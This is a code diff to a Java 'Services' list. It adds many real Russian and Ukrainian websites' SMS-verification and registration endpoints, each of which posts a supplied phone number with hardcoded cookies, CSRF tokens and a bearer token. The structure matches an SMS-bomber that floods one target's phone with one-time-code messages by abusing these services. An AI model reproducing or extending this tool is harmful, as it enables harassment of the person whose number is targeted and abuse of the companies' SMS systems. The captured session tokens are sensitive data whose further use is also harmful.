@@ -482,7 +482,7 @@ public class Services {
                     builder.add("signedParameters", "");
                     builder.add("query[phone]", format(phone, "+7 (***) ***-**-**"));
                     builder.add("SITE_ID", "s1");
-                    builder.add("sessid", "3138322a7c84ed7650039e465ffd5908");
+                    builder.add("sessid", "b4f37bbc68c502a6f442db031b3b65ea");
                 }
             },
 
@@ -888,6 +888,297 @@ public class Services {
                     }
 
                     return json.toString();
+                }
+            },
+
+            new JsonService("https://xn--90aamkcop0a.xn--p1ai/api/v5/user/start-authorization", 7) {
+                @Override
+                public String buildJson() {
+                    JSONObject json = new JSONObject();
+
+                    try {
+                        json.put("phone", format(phone, "+7 *** ***-**-**"));
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+
+                    return json.toString();
+                }
+            },
+
+            new JsonService("https://xn--80adjkr6adm9b.xn--p1ai/api/v5/user/start-authorization", 7) {
+                @Override
+                public String buildJson() {
+                    JSONObject json = new JSONObject();
+
+                    try {
+                        json.put("phone", format(phone, "+7 *** ***-**-**"));
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+
+                    return json.toString();
+                }
+            },
+
+            new Service(7) {
+                @Override
+                public void run(OkHttpClient client, Callback callback) {
+                    client.newCall(new Request.Builder()
+                            .url("https://mirage.ru/api/ajax.php")
+                            .post(RequestBody.create("------WebKitFormBoundarylD2tjgLGIApyeAbe\n" +
+                                    "Content-Disposition: form-data; name=\"phone\"\n\n" +
+                                    format(phone, "+7 (***) ***-**-**") +
+                                    "\n------WebKitFormBoundarylD2tjgLGIApyeAbe\n" +
+                                    "Content-Disposition: form-data; name=\"func\"\n\n" +
+                                    "auth_send_code\n" +
+                                    "------WebKitFormBoundarylD2tjgLGIApyeAbe\n" +
+                                    "Content-Disposition: form-data; name=\"module\"\n\n" +
+                                    "cabinet\n" +
+                                    "------WebKitFormBoundarylD2tjgLGIApyeAbe--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundarylD2tjgLGIApyeAbe")))
+                            .build()).enqueue(callback);
+                }
+            },
+
+            new FormService("https://avilon.ru/ajax/modal/auth.php", 7) {
+                @Override
+                public Request buildRequest(Request.Builder builder) {
+                    builder.addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.43");
+
+                    return super.buildRequest(builder);
+                }
+
+                @Override
+                public void buildBody(FormBody.Builder builder) {
+                    builder.add("action", "1");
+                    builder.add("step", "1");
+                    builder.add("template", "mobile");
+                    builder.add("phone", format(phone, "+7 *** *** ** **"));
+                }
+            },
+
+            new ParamsService("https://fe.dominospizza.ru/api/authentication/sendVerificationSms", "POST", 7) {
+                @Override
+                public Request buildRequest(Request.Builder builder) {
+                    builder.addHeader("authorization", "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.lk7imFwFM9_w7KDujmn0jxArTGubuk-GZOw2r-RGAGeV1BDiFJZJzQ.AFBzB-1QZo01LFVo-c1X6w.7YADNKglX4DWWqFyz09vl9ze0KySLLHiDvIiQYef02c_kmrDnFBmPKibAR5EVREzZRTmN4sJ6lFNwYLeMtOaqrNWyJGz3zcYoahvjcjB5B9mCfLcVX1ugbCvYpbimvACn4P613afErS_0VvShR8vsdv3T3z6q5qx3w9CmuDLkzUUnqJ8BvO8kafNQQsUhZ6vJBoxv6cLf4UKNzHwGFU84g6kx2aBP2jJV8H6bpzbRqRsGWKWxb46ZKW01Cs5-BesuhNN25euWpY4uwYkM0Lqz6UX9_Hu0b7cZyH6JOy_H_y6aHZm1mZdiWex_FSbIf6it2_oZgsRFQLMPRqwfl9JXeCLrtaXipbwUjrFvaOC3pnEgYZ_y0iiCgse_i1tneeHgwQm7sjM7qEskqLPkqXOe2rCqn3mjFtfMAw95nrOXPQQ38UqEAdWUvDJDh141WYLw-wLfKjONldE0b-dNk5coKeptItF-0abCWgq6s6giAs.JZ-M2bpaATtWYaLPm3-hqA");
+
+                    return super.buildRequest(builder);
+                }
+
+                @Override
+                public void buildParams(HttpUrl.Builder builder) {
+                    builder.addQueryParameter("phoneNumber", phone);
+                }
+            },
+
+            new JsonService("https://beloris.ru/ajax/users/send_sms_login", 7) {
+                @Override
+                public Request buildRequest(Request.Builder builder) {
+                    builder.addHeader("x-csrf-token", "");
+
+                    return super.buildRequest(builder);
+                }
+
+                @Override
+                public String buildJson() {
+                    JSONObject json = new JSONObject();
+
+                    try {
+                        json.put("phone", format(phone, "+7(***) ***-****"));
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+
+                    return json.toString();
+                }
+            },
+
+            new JsonService("https://vyksa.fitauto.ru/users.getsmscode.fn", 7) {
+                @Override
+                public String buildJson() {
+                    JSONObject json = new JSONObject();
+
+                    try {
+                        json.put("phone", phone);
+                        json.put("token", "QJB68LnzWeFWphIwFSNW0oEiqDmKKc8lJ8TbU7Wm");
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+
+                    return json.toString();
+                }
+            },
+
+            new ParamsService("https://m.avtoall.ru/cart/order/api/phone", 7) {
+                @Override
+                public Request buildRequest(Request.Builder builder) {
+                    builder.addHeader("Cookie", "PHPSESSID3=1lld5u0hic440f37ilipkcaq71; out_location_data=C%3A15%3A%22OutLocationData%22%3A48%3A%7Ba%3A2%3A%7Bs%3A10%3A%22locationId%22%3Bb%3A0%3Bs%3A9%3A%22confirmed%22%3Bb%3A0%3B%7D%7D; split=split-a; _ga=GA1.2.876559525.1644854748; _gid=GA1.2.144615146.1644854748; _ym_uid=1644854749375021234; _ym_d=1644854749; lastHost=m.avtoall.ru; _ym_isad=2; _dn_sid=ee0c8210-3e11-4fed-ba9f-05ed60687722; location_data=C%3A12%3A%22LocationData%22%3A55%3A%7Ba%3A2%3A%7Bs%3A10%3A%22locationId%22%3Bs%3A4%3A%222941%22%3Bs%3A9%3A%22confirmed%22%3Bb%3A1%3B%7D%7D");
+
+                    return super.buildRequest(builder);
+                }
+
+                @Override
+                public void buildParams(HttpUrl.Builder builder) {
+                    builder.addQueryParameter("phone", format(phone, "+7 (***) ***-****"));
+                    builder.addQueryParameter("key", "51df7fb4cfc3e8e518fa346710b7712e");
+                }
+            },
+
+            new JsonService("https://dnipro-m.ua/phone-verification/") {
+                @Override
+                public Request buildRequest(Request.Builder builder) {
+                    builder.addHeader("x-csrf-token", "2Ame-KM1DXP3ATTtBQ1ks-pj771B-P6hyQMiztAeYkLoZ8qOwGVDJJxScIY1PRDfnAWr9QSvie2cUXCNqlI9LA==");
+                    builder.addHeader("Cookie", "PHPSESSID=rshi0gctd3nsddcs58l865tu6q; session_hash=8d5affc2cad1a00ddfe8fa3f067e13b8; ab_1=2; logged_in_as=c38cdce2f7ef0094f910220849aee84a3613eb500f51202d492282b1d416cf91a%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22logged_in_as%22%3Bi%3A1%3BN%3B%7D; manager_store=9f8a6a348bfddc4e1484e8c2b620e744a46020143d5011858217908bfa12f43ca%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22manager_store%22%3Bi%3A1%3BN%3B%7D; language=1f1c77ed088a525c9d9a3ee0075b68d6a50c75278eb07b95c9c6c8adf4633886a%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22language%22%3Bi%3A1%3Bs%3A2%3A%22ru%22%3B%7D; translations_pushed=92f83c1f3a434aeae744854c974cdb236df315cbe39e518ed7234b1ea9a0cd88a%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22translations_pushed%22%3Bi%3A1%3Bi%3A1%3B%7D; _csrf-frontend=8ed0eca3dbc58c275be1804686501b2aa4c60f1f562d2e2098d3651b66a2af18a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%220nTvcPNWkSDk00tlvfDHEWwLURRCzL_n%22%3B%7D; _gcl_au=1.1.439638018.1644856370; _gid=GA1.2.162073021.1644856370; _dc_gtm_UA-87493814-1=1; sc=3E8EF674-EB02-A8ED-92DC-DA62D3B448B9; _fbp=fb.1.1644856370513.191414281; _hjSessionUser_1116764=eyJpZCI6IjExMzBlN2U4LWFhODAtNTRlZi1iODY2LWIyMDgzMWViNjVmOCIsImNyZWF0ZWQiOjE2NDQ4NTYzNzExMjUsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_1116764=eyJpZCI6ImZjYzMyNmRhLTNkZTUtNGM1ZC1iMTE2LTVjNjNhN2JlNmQ5MSIsImNyZWF0ZWQiOjE2NDQ4NTYzNzExNTYsImluU2FtcGxlIjpmYWxzZX0=; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=0; _ga_1QMTESJ6M0=GS1.1.1644856371.1.0.1644856371.60; _ga=GA1.2.683370447.1644856370; _gat_UA-87493814-1=1; csfp=47a8c34d1a498bd8daee7742cb48c821");
+                    builder.addHeader("x-requested-with", "XMLHttpRequest");
+
+                    return super.buildRequest(builder);
+                }
+
+                @Override
+                public String buildJson() {
+                    JSONObject json = new JSONObject();
+
+                    try {
+                        json.put("phone", getFormattedPhone());
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+
+                    return json.toString();
+                }
+            },
+
+            new JsonService("https://api.raketaapp.com/v1/auth/otps?ngsw-bypass=true") {
+                @Override
+                public String buildJson() {
+                    JSONObject json = new JSONObject();
+
+                    try {
+                        json.put("phone", getFormattedPhone());
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+
+                    return json.toString();
+                }
+            },
+
+            new ParamsService("https://c.ua/index.php?route=account/loginapples/sendSMS", 380) {
+                @Override
+                public void buildParams(HttpUrl.Builder builder) {
+                    builder.addQueryParameter("route", "account/loginapples/sendSMS");
+                    builder.addQueryParameter("phone", "0" + phone);
+                }
+            },
+
+            new JsonService("https://oauth.av.ru/check-phone", 7) {
+                @Override
+                public Request buildRequest(Request.Builder builder) {
+                    builder.addHeader("Cookie", "rrpvid=50921543596612; rcuid=61fc0f0fd6d3b0000109d97d; _fbp=fb.1.1644942354474.861857136; scarab.visitor=%221DFC214A72CE04B6%22; _gcl_au=1.1.468949459.1644942355; tmr_lvid=8d216dc77735473614cf84f36356f5e2; tmr_lvidTS=1644942355170; _ga=GA1.2.1631079387.1644942355; _gid=GA1.2.1730181075.1644942355; _dc_gtm_UA-44837825-1=1; _ym_d=1644942355; _ym_uid=1644942355426542771; _ym_isad=2; _ym_visorc=w; gdeslon.ru.__arc_domain=gdeslon.ru; gdeslon.ru.user_id=8c6de077-7f3b-4af2-8e06-9f0243dab8e8; session-cookie=16d4025de27335c1cb1a64b9beb261f52d904910639583d6de7337b0b56dab805408c3b797154802caa253c26623b9d2; XSRF-TOKEN=eyJpdiI6IlBmdlhGTXZrbmk1U1YxaW14TWlaclE9PSIsInZhbHVlIjoieE9zYU9rR3hEZ2tsWGROWFRFVmlUZU5sVXFrZG00bFB0bUZ6ZE5wMWN1eW9ZcnBVU1poT3RWZkw1QUEycG9mTiIsIm1hYyI6ImUzOWFhYzEwMzNkN2M1ZGE0MmRmZDMyMzQ0ZTc0NWViNWE5MGNjNzUwMTRlOTkxNjA5Y2IxNjA3NjJjNzg0MzAifQ%3D%3D; laravel_session=eyJpdiI6Ikp0UndrSHhhVmJwWVhoaERpSmJOYmc9PSIsInZhbHVlIjoiRldtOE5KY01iSFh3RnRVQ0liaE9mQXpxYjg5ekFhSGpiWHZLRWVYTVlNd3BPUytmQmYwNFB3WHZnUEV4NFBySSIsIm1hYyI6IjIyZjhkNWRiYzFkYTllNzM4YWM4MjliMDMwYzE0NDMwMTdiYzAwNmY0YmZiMmEzMWM0MTExM2UwN2MwMGE0M2EifQ%3D%3D; font=phone; _dc_gtm_UA-73212427-1=1; tmr_reqNum=23; tmr_detect=0%7C1644942368834");
+                    builder.addHeader("x-ajax-token", "5592b90ee98edbba757b233367431ad8e130b84cbeb2599262f0ebf957f36b68");
+                    builder.addHeader("x-csrf-token", "QpZQnv8B7Myy3yU2TYQqVwjVsM4iPL3CarHb5M2g");
+                    builder.addHeader("x-xsrf-token", "eyJpdiI6IlBmdlhGTXZrbmk1U1YxaW14TWlaclE9PSIsInZhbHVlIjoieE9zYU9rR3hEZ2tsWGROWFRFVmlUZU5sVXFrZG00bFB0bUZ6ZE5wMWN1eW9ZcnBVU1poT3RWZkw1QUEycG9mTiIsIm1hYyI6ImUzOWFhYzEwMzNkN2M1ZGE0MmRmZDMyMzQ0ZTc0NWViNWE5MGNjNzUwMTRlOTkxNjA5Y2IxNjA3NjJjNzg0MzAifQ==");
+
+                    return super.buildRequest(builder);
+                }
+
+                @Override
+                public String buildJson() {
+                    JSONObject json = new JSONObject();
+
+                    try {
+                        json.put("phone", format(phone, "+7 (***) ***-**-**"));
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+
+                    return json.toString();
+                }
+            },
+
+            new ParamsService("https://www.farpost.ru/sign/code/4f4fa7e19e3ba823af9bfc8af95bfd3d/send") {
+                @Override
+                public void buildParams(HttpUrl.Builder builder) {
+                    builder.addQueryParameter("sign", getFormattedPhone());
+                    builder.addQueryParameter("return", "/");
+                }
+
+                @Override
+                public Request buildRequest(Request.Builder builder) {
+                    builder.addHeader("Cookie", "ring=09090bc822948c9b09190782e129530d; _gid=GA1.2.1845397233.1644852398; PHPSESSID=09090bc822948c9b09190782e129530d; _ga_G0RWKN84TQ=GS1.1.1644942896.3.1.1644942996.0; _gat=1; _ga=GA1.1.228350603.1644852398");
+
+                    return super.buildRequest(builder);
+                }
+            },
+
+            new FormService("https://client.taximaxim.com/ru-RU/site/send-code/?tax-id=yFL33BWu8yOEhqH0C0bV8BfGWKFjFba7Sxdwcdfppe71sHd4uxidkbS5%2B%2BYzBsW%2BiAH1yXFh2Na5bJdvZaNNTNRa6w%2BY1xpwqd1XUGEIcJc%3D") {
+                @Override
+                public void buildBody(FormBody.Builder builder) {
+                    builder.add("_csrf", "kxA-oV0mlFWdBCIB7ILw3rimGOLKolF08U3T-xRAHODhR27nE3LDANN1Flmt27uT7tZVpqHsJhCmAJ-OLAMurw==");
+                    builder.add("LoginForm[org]", "maxim");
+                    builder.add("LoginForm[country]", "KZ");
+                    builder.add("LoginForm[baseId]", "2647");
+                    builder.add("LoginForm[phone]", format(phone, "+7(***)***-**-**"));
+                    builder.add("LoginForm[code]", "");
+                    builder.add("LoginForm[sendCodeType]", "0");
+                }
+
+                @Override
+                public Request buildRequest(Request.Builder builder) {
+                    builder.addHeader("Cookie", "_gcl_au=1.1.1590444723.1644943405; ga4_ga=GA1.1.1194255158.1644943405; _fbp=fb.1.1644943405522.1545141459; tmr_lvid=240c8ea73522f433a343f40b415fe8da; tmr_lvidTS=1644943405689; _ga=GA1.2.1194255158.1644943405; _gid=GA1.2.856429364.1644943406; _gat=1; _ym_uid=1644943406270600745; _ym_d=1644943406; _ym_isad=2; _ym_visorc=w; TAXSEE_V3MAXIM=l3thvebia464dbs2koje0n3hgv; __finger_print_hash=6e47d4b191dc6ac30a1d7606a5fa7a7a72cb20cc9e0853935099d982901443b9a%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22__finger_print_hash%22%3Bi%3A1%3Bs%3A32%3A%2264d178a6ae165b1da838d27d84a1e244%22%3B%7D; __intl=1a6c3f19d825211b4b399b7960038c6d1a93438adf1deb9825ed10de11d478f0a%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22__intl%22%3Bi%3A1%3Bs%3A5%3A%22ru-RU%22%3B%7D; _csrf=d92a7efa1c07f1ffe242d52d34c2845fc5430ca22a0a772cb9ff56f9528cb7faa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rWPFNTWUNq4XAYKMVpMDkNwdWMLu8C2O%22%3B%7D; ga4_ga_21NZZ0KWNK=GS1.1.1644943405.1.1.1644943408.57; tmr_reqNum=4");
+                    builder.addHeader("X-CSRF-Token", "kxA-oV0mlFWdBCIB7ILw3rimGOLKolF08U3T-xRAHODhR27nE3LDANN1Flmt27uT7tZVpqHsJhCmAJ-OLAMurw==");
+
+                    return super.buildRequest(builder);
+                }
+            },
+
+            new JsonService("https://www.kolesa-darom.ru/ajax/user/register") {
+                @Override
+                public Request buildRequest(Request.Builder builder) {
+                    builder.addHeader("X-Bitrix-Csrf-Token", "80d2bb6c5a485281fede4066666273ab");
+
+                    return super.buildRequest(builder);
+                }
+
+                @Override
+                public String buildJson() {
+                    JSONObject json = new JSONObject();
+
+                    try {
+                        json.put("approveRule", true);
+                        json.put("phoneNumber", getFormattedPhone());
+                        json.put("step", new JSONObject().put("requestCode", "requestCode"));
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+
+                    return json.toString();
+                }
+            },
+
+            new Service(7) {
+                @Override
+                public void run(OkHttpClient client, Callback callback) {
+                    client.newCall(new Request.Builder()
+                            .url("https://api.pizzasan.ru/api/clients/do_register")
+                            .post(RequestBody.create("------WebKitFormBoundaryVtaTywrDHtBorVsK\n" +
+                                    "Content-Disposition: form-data; name=\"name\"\n" +
+                                    "\n" +
+                                    "\n" +
+                                    "------WebKitFormBoundaryVtaTywrDHtBorVsK\n" +
+                                    "Content-Disposition: form-data; name=\"phone\"\n" +
+                                    "\n" +
+                                    format(phone, "8(***) ***-****") +
+                                    "\n------WebKitFormBoundaryVtaTywrDHtBorVsK\n" +
+                                    "Content-Disposition: form-data; name=\"password\"\n" +
+                                    "\n" +
+                                    "1234567\n" +
+                                    "------WebKitFormBoundaryVtaTywrDHtBorVsK\n" +
+                                    "Content-Disposition: form-data; name=\"password_2\"\n" +
+                                    "\n" +
+                                    "1234567\n" +
+                                    "------WebKitFormBoundaryVtaTywrDHtBorVsK--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryVtaTywrDHtBorVsK")))
+                            .build()).enqueue(callback);
                 }
             },
     };
